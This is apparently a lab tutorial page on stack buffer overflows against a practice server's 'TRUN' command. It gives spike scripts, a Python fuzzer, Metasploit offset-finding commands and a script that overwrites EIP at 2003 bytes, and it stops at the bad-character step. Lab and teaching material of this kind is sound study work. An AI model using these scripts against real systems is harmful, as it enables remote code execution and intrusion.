# BoF

![](<../.gitbook/assets/image (27).png>)

![](<../.gitbook/assets/image (26).png>)

Upon success, we can use the EIP to point to directions we instruct (i.e. our malicious code that will give us a reverse shell)

## Spiking

Spiking is when you take a command and throw a bunch of characters at it to see if you can overflow its buffer. If the program crashes, then we know that command is vulnerable. If it doesn't, then maybe it isn't vulnerable and we can move to the next command

![](<../.gitbook/assets/image (73).png>)

{% code title="stats.spk" %}
```bash
s_readline();
s_string("STATS ");
s_string_variable("0");
```
{% endcode %}

{% code title="trun.spk" %}
```bash
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
{% endcode %}

```
generic_send_tcp 192.168.183.130 9999 stats.spk 0 0 
generic_send_tcp 192.168.183.130 9999 trun.spk 0 0 
```

![](<../.gitbook/assets/image (47).png>)

![](<../.gitbook/assets/image (66).png>)

## Fuzzing

Fuzzing similar to spiking where we're sending a bunch of characters at a specific command and trying to break it. The difference, however, is that spiking targets multiple commands to try to find what's vulnerable. When we know which command is vulnerable we'll attack that command specifically

{% code title="1.py" %}
```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.183.130',9999))

                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```
{% endcode %}

![](<../.gitbook/assets/image (23).png>)

## Finding the Offset

Looking for where we can overwrite the EIP since that is what we want to control

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

```

{% code title="2.py" %}
```python
#!/usr/bin/python
import sys, socket

offset = ""

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.183.130',9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
		
except:
	print "Error connecting to server"
	sys.exit()
```
{% endcode %}

This should give us the value of the EIP. Then we'll use another tool to find it's Offset

![](<../.gitbook/assets/image (25).png>)

```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
[*] Exact match at offset 2003
```

So at 2003 bytes, we can control the EIP.&#x20;

## Overwrite the EIP

We learned that the offset was at 2003 bytes meaning there are 2003 bytes right before you get to the EIP and then the EIP itself is 4 bytes long

```python
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.183.130',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()
		
except:
	print "Error connecting to server"
	sys.exit()
```

![](<../.gitbook/assets/image (28).png>)

We now control the EIP! We just need to find the bad characters and the right module to send this too

## Finding Bad Characters

This in relation to generating shellcode. When generating shellcode, we need to know what characters are good for the shellcode and what characters are bad. We do this by running all the hex characters through our program and see if any of them act up. By default, the null byte (x00) acts up.
